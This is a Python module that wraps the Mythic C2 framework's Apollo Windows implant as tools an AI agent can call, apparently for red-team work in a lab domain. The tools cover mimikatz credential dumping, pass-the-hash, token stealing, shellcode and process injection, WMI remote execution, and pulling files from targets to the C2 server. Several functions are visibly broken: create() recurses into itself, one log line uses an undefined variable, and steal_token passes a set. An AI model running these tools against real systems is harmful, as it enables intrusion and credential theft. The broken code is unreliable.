import typing as t
from dataclasses import dataclass
from pathlib import Path

from loguru import logger
from mythic import mythic  # type: ignore
from mythic.mythic import Mythic  # type: ignore

from dreadnode.agent.tools import Toolset, tool_method

MAX_ACTOR_PAYLOAD_SIZE = 1 * 1024 * 1024


SCRIPTS_DIR = Path(__file__).resolve().parent / "scripts"


@dataclass
class Apollo(Toolset):
    _client: Mythic = None
    _callback_id: int | None = None
    _intialized: bool = False

    name: str = "Apollo"
    description: str = "A Windows Post-Exploitation Tool"

    @classmethod
    async def create(
        cls,
        username: str,
        password: str,
        server_ip: str,
        server_port: int,
        timeout: int = -1,
        callback_id: int = 0,
    ) -> "Apollo":
        """Create an instance of the Apollo class."""

        instance = cls()

        try:
            client = await mythic.login(
                username=username,
                password=password,
                server_ip=server_ip,
                server_port=server_port,
                timeout=timeout,
            )

            instance._client = client
            instance._callback_id = callback_id
            instance._intialized = True
            await instance.create(
                username=username,
                password=password,
                server_ip=server_ip,
                server_port=server_port,
                timeout=timeout,
            )
        except Exception as e:
            err_msg = f"Failed to login to Mythic: {e}"
            logger.error(err_msg)
            raise RuntimeError(err_msg) from e
        else:
            return instance

    async def execute(
        self,
        command: str,
        args: dict[str, t.Any] | str,
        timeout: int | None = None,
    ) -> str:
        """
        Executes supplied command to the Apollo implant through the Mythic C2 framework
        """
        logger.debug(f"Executing command: {command} with args: {args}")

        try:
            output_bytes = await mythic.issue_task_and_waitfor_task_output(
                mythic=self._client,
                command_name=command,
                parameters=args,
                callback_display_id=self._callback_id,
                timeout=timeout,
            )
        except (TimeoutError, ValueError) as e:
            output = f"An unexpected error occured when trying to execute previous command. The error is:\n\n{e}.\n. Sometimes the command just needs to be re-executed, however if already tried to re-execute the command, best to move on to another."
            logger.warning(output)
            return output

        if not output_bytes:
            output = f"Command '{command}' returned no output."
            logger.debug(output)
            return output

        logger.debug(f"Command output: {output}")

        return str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)

    @tool_method(name="cat", description="Read the contents of a file at the specified path.")
    async def cat(
        self,
        path: t.Annotated[str, "The path of the file to read."],
    ) -> str:
        if not path:
            path = ""

        return await self.execute(
            command="cat",
            args=path,
        )

    @tool_method()
    async def cd(self, path: t.Annotated[str, "The path to change into."]) -> str:
        """
        Change directory to [path]. Path relative identifiers such as ../ are accepted. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the agent.

        Examples:
            cd -path C:\\\\Users\\Public\\Documents
            cd ..
        """

        return await self.execute(
            command="cd",
            args=path,
        )

    @tool_method()
    async def cp(
        self,
        source: t.Annotated[str, "The path to the source file on the target system to copy."],
        dest: t.Annotated[
            str | None,
            "The destination path on the target system to copy the file to.",
        ],
    ) -> str:
        """
        Copy a file from the source path to the destination path on the target system. The source and destination paths can be absolute or relative. If the paths are relative, they will be resolved against the current working directory of the agent.

        Examples:
            cp c:\\\\path\\to\\source.txt C:\\\\path\\to\\destination.txt
            cp -path C:\\\\path\\to\\source.txt" -dest" C:\\\\path\\to\\destination.txt
        """

        return await self.execute(
            command="cp",
            args={
                "-source": source,
                "-dest": dest,
            },
        )

    @tool_method()
    async def download(
        self,
        path: t.Annotated[str, "The full path of the file on the target system to download."],
    ) -> str:
        """
        Download a file from the target system to the C2 server. The file will be saved with the specified filename on the C2 server.

        Examples:
            download -path "C:\\\\Windows\\\\passwords.txt"
        """

        return await self.execute(
            command="download",
            args=path,
        )

    @tool_method()
    async def getprivs(self) -> str:
        """
        Attempt to enable all possible privileges for the agent's current access token. This may include privileges like SeDebugPrivilege, SeImpersonatePrivilege, etc.
        """
        return await self.execute(
            command="getprivs",
            args="",
        )

    @tool_method()
    async def ifconfig(self) -> str:
        """
        List the network interfaces and their configuration details on the target system. This includes IP addresses, subnet masks, and other relevant information.
        """
        return await self.execute(
            command="ifconfig",
            args="",
        )

    @tool_method()
    async def jobkill(
        self,
        jid: t.Annotated[int, "The job identifier of the background job to terminate."],
    ) -> str:
        """
        Terminate a background job with the specified job identifier (jid). This will stop the job from running and free up any resources it was using.

        Examples:
            jobkill 12345
            jobkill -jid 67890
            jobkill {"jid": 12345}
        """
        return await self.execute(command="jobkill", args={"jid": jid})

    @tool_method()
    async def jobs(self) -> str:
        """
        Get all currently active background jobs being managed by the agent.

        Prompt:
            List all currently active background jobs being managed by the agent. This includes jobs that are running, completed, or failed.

        Examples:
            jobs
            jobs -all
            jobs {"all": true}
        """

        return await self.execute(
            command="jobs",
            args="",
        )

    @tool_method()
    async def ls(
        self,
        path: t.Annotated[
            str | None,
            "The path of the directory to list. Defaults to the current working directory.",
        ],
    ) -> str:
        """
        List files and folders in a specified directory.
        If no path is specified, the current working directory will be used. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the implant.
        """
        path = "" if not path or "null" in path.lower() else {"Path": path}

        return await self.execute(
            command="ls",
            args=path,
        )

    @tool_method()
    async def make_token(
        self,
        username: t.Annotated[str, "The username to use for the new logon session."],
        password: t.Annotated[str, "The password for the specified username."],
        netonly: t.Annotated[
            str | None,
            "If true, the token will be created for network access only. If false, the token will be created for interactive access.",
        ],
    ) -> str:
        """
        Create a new logon session using the specified [username] and [password]. The token can be created for network access only or interactive access based on the [netonly] parameter.

        Examples:
            make_token -username user -password password -netonly false
            make_token {"username": "user", "password": "password", "netonly": false}
            make_token {"username": "domain\\sam_accountname","password": "users_password","netOnly": true}
        """
        return await self.execute(
            command="make_token",
            args={"username": username, "password": password, "netOnly": str(netonly)},
        )

    @tool_method()
    async def mimikatz(
        self,
        commands: t.Annotated[
            list[str],
            "A list of Mimikatz commands to execute. Each command should be separated by a newline.",
        ],
    ) -> str:
        """
        Execute one or more mimikatz commands using its reflective library.

        Examples:
            mimikatz sekurlsa::logonpasswords
            mimikatz sekurlsa::tickets
            mimikatz token::list
            mimikatz lsadump::sam
            mimikatz sekurlsa::wdigest
            mimikatz vault::cred
            mimikatz vault::list
            mimikatz sekurlsa::dpapi
        """

        return await self.execute(
            command="mimikatz",
            args=commands,
        )

    @tool_method(
        name="net_dclist",
        description="Enumerate Domain Controllers for the specified domain (or the current domain).",
    )
    async def net_dclist(
        self,
        domain: t.Annotated[
            str | None,
            "The target domain for which to enumerate Domain Controllers. Defaults to the current domain if omitted.",
        ],
    ) -> str:
        return await self.execute(
            command="net_dclist",
            args={"Domain": domain},
        )

    @tool_method()
    async def net_localgroup(
        self,
        computer: t.Annotated[
            str | None, "Defaults to the local machine (localhost) if omitted."
        ] = None,
    ) -> str:
        """
        List the local groups on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_localgroup -computer "east.dreadnode.local"
            net_localgroup -computer "east.dreadnode.local"
        """

        return await self.execute(
            command="net_localgroup",
            args=computer or "",
        )

    @tool_method()
    async def net_localgroup_member(
        self,
        group: t.Annotated[str, "The name of the local group to list members for."],
        computer: t.Annotated[
            str | None,
            "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
        ] = None,
    ) -> str:
        """
        List the members of a specific local [group] on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_localgroup_member -computer "east.dreadnode.local" -group "Administrators"
            net_localgroup_member -computer "domain1.north.dreadnode.local" -group "Users"
        """

        return await self.execute(
            command="net_localgroup_member",
            args=f"-group {group} -computer {computer} " if computer else f"-group {group}",
        )

    @tool_method()
    async def net_shares(
        self,
        computer: t.Annotated[
            str,
            "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
        ],
    ) -> str:
        """
        List network shares available on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_shares -computer "north.sevenkingdoms.local"
            net_shares -computer "winterfell.north.sevenkingdoms.local"
        """

        return await self.execute(
            command="net_shares",
            args={"Computer": computer},
        )

    @tool_method()
    async def netstat(self) -> str:
        """Display active TCP/UDP connections and listening ports on the target system. This includes information about the local and remote addresses, port numbers, and connection states."""

        return await self.execute(command="netstat", args="")

    @tool_method()
    async def powerpick(
        self,
        arguments: t.Annotated[
            str,
            "The PowerShell command or script block to execute. This can be a single command or a script block enclosed in curly braces.",
        ],
    ) -> str:
        """
        Injects a PowerShell loader into a sacrificial process and executes the provided PowerShell [command]. This allows for executing PowerShell commands or scripts in the context of the agent's current security token.

        powerpick -arguments "Get-Process"
        """
        return await self.execute(command="powerpick", args=arguments)

    @tool_method()
    async def powershell_import(
        self,
        filename: t.Annotated[
            str,
            ".ps1 file to be registered within Apollo agent and made available to PowerShell jobs",
        ],
    ) -> str:
        """
        Register a new powershell .ps1 file in the Apollo agent and allow for powershell script to be available for PowerShell jobs.
        This is not Powershell's Import-Module command but Apollo's native powershell import command. The file must exist on the Mythic C2 server. If file is not present, it can be uploaded with the upload tool.
        """
        return await self.execute(
            command="powershell_import", args={"existingFile": filename}, timeout=60
        )

    @tool_method()
    async def pth(
        self,
        domain: t.Annotated[
            str, "The target domain for which to perform the Pass-the-Hash operation."
        ],
        username: t.Annotated[str, "The username to authenticate as."],
        password_hash: t.Annotated[
            str,
            "The NTLM hash of the user's password. This is used instead of the plaintext password.",
        ],
    ) -> str:
        """
        Authenticate to a remote system using a Pass-the-Hash technique with the specified [domain], [username], and [password_hash]. This allows for authentication without needing the plaintext password.

        Examples:
            pth -domain "north.sevenkingdoms.local" -username "jeor.mormont" -password_hash "5f4dcc3b5aa765d61d8327deb882cf99"
        """
        return await self.execute(
            command="pth",
            args={
                "-domain": domain,
                "-username": username,
                "-password_hash": password_hash,
            },
        )

    @tool_method()
    async def ps(
        self,
        args: t.Annotated[str, "arguments for the 'ps' command, encoded in a string"],
    ) -> str:
        """List running processes on the target system, typically including PID, name, architecture, and user context."""
        return await self.execute(
            command="ps",
            args=args,
        )

    @tool_method()
    async def pwd(self) -> str:
        """Print the agent's current working directory on the target system. This is the directory where the agent is currently operating."""
        return await self.execute(
            command="pwd",
            args="",
        )

    @tool_method()
    async def reg_query(
        self,
        key: t.Annotated[
            str,
            "The full path of the registry key to query (e.g., 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion').",
        ],
    ) -> str:
        """Query the values and subkeys under a specified registry [key]. This allows for retrieving information from the Windows registry.

        Examples:
            reg_query -key "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion"
        """
        return await self.execute(
            command="reg_query",
            args=key,
        )

    @tool_method()
    async def register_assembly(
        self,
        filename: t.Annotated[str, "Assembly file to register to the Apollo agent"],
    ) -> str:
        """
        Registers (loads) assembly files/commands to a Mythic agent.
        """
        return await self.execute(command="register_assembly", args={"existingFile": filename})

    @tool_method()
    async def rev2self(self) -> str:
        """
        Revert the agent's impersonation state, returning to its original primary token. This is useful for restoring the agent's original security context after performing actions with a different token.

        This command is useful when the agent has been impersonating another user or process and needs to revert back to its original state.
        """
        return await self.execute(
            command="rev2self",
            args="",
        )

    @tool_method()
    async def set_injection_technique(
        self,
        technique: t.Annotated[
            str,
            "The name of the process injection technique to use for subsequent injection commands (e.g., 'CreateRemoteThread', 'MapViewOfSection'). Must be a technique supported by the agent (see `get_injection_techniques`).",
        ],
    ) -> str:
        """
        Set the default process injection technique used by commands like `assembly_inject`, `execute_assembly`, etc. This allows for specifying the method of injecting code into a target process.

        Examples:
            set_injection_technique -technique "CreateRemoteThread"
        """
        return await self.execute(
            command="set_injection_technique",
            args=technique,
        )

    @tool_method()
    async def shinject(self) -> str:
        """
        Inject raw shellcode into a remote process. This allows for executing arbitrary code in the context of another process.

        Examples:
            shinject -path "C:\\\\Windows\\\\System32\\\\notepad.exe" -shellcode "0x90, 0x90, 0x90"
        """
        return await self.execute(
            command="shinject",
            args="",
        )

    @tool_method()
    async def spawn(self) -> str:
        """Spawn a new agent session using the currently configured 'spawnto' executable and payload template (must be shellcode)."""

        return await self.execute(
            command="spawn",
            args="",
        )

    @tool_method()
    async def spawnto_x64(
        self,
        path: t.Annotated[
            str,
            "The full path to the 64-bit executable that the agent should launch for subsequent post-exploitation jobs or spawning new sessions.",
        ],
        args: t.Annotated[
            str | None,
            "A list of command-line arguments to launch the [path] executable with.",
        ],
    ) -> str:
        """
        Configure the default 64-bit executable [path] (and optional [args]) used for process injection targets and spawning. This allows for specifying the executable that will be used for subsequent post-exploitation jobs or spawning new sessions.

        Examples:
            spawnto_x64 -path "C:\\\\Windows\\\\System32\\\\notepad.exe" -args "-arg1 -arg2"
        """
        return await self.execute(
            command="spawnto_x64",
            args={"-Path": path, "-Args": args} if args else {"-Path": path},
        )

    @tool_method()
    async def steal_token(
        self,
        pid: t.Annotated[
            int,
            "The process ID (PID) from which to steal the primary access token. If omitted, a default process (like winlogon.exe) might be targeted.",
        ],
    ) -> str:
        """
        Impersonate the primary access token of another process specified by its [pid]. This allows for executing commands with the security context of the target process.

        Examples:
            steal_token -pid 1234
        """
        return await self.execute(
            command="steal_token",
            args={"-pid", pid},
        )

    @tool_method()
    async def unlink(self) -> str:
        """
        Disconnect a specific callback communication channel (e.g., an SMB or TCP P2P link). This allows for terminating the connection to a specific channel without affecting other channels.

        Examples:
            unlink -channel "smb"
        """
        return await self.execute(
            command="unlink",
            args="",
        )

    @tool_method()
    async def upload(
        self,
        path: t.Annotated[str, "Local path of the file to upload"],
        destination: t.Annotated[str, "Destination path on the remote host"],
    ) -> str:
        """
        Upload a file from the C2 server/operator machine to the target system. The file will be saved with the specified filename on the target system.

        Examples:
            upload -path "C:\\Windows\\passwords.txt" -dest "C:\\Users\\Administrator\\passwords.txt"
            upload {"Path": "C:\\Windows\\passwords.txt", "Destination": "C:\\Users\\Administrator\\passwords.txt"}
        """

        return await self.execute(
            command="upload",
            args={"Path": path, "Destination": destination},
        )

    @tool_method()
    async def whoami(self) -> str:
        """Display the username associated with the agent's current security context (impersonated token or primary token). This includes information about the user and their privileges."""
        return await self.execute(
            command="whoami",
            args="",
        )

    @tool_method()
    async def wmiexecute(
        self,
        arguments: t.Annotated[str, "The command or script block to execute on the remote system."],
    ) -> str:
        """Execute a command on a remote system using WMI (Windows Management Instrumentation). This allows for executing commands remotely without needing to establish a direct connection.

        Examples:
            wmiexecute -arguments "Get-Process"
        """
        return await self.execute(
            command="wmiexecute",
            args=arguments,
        )
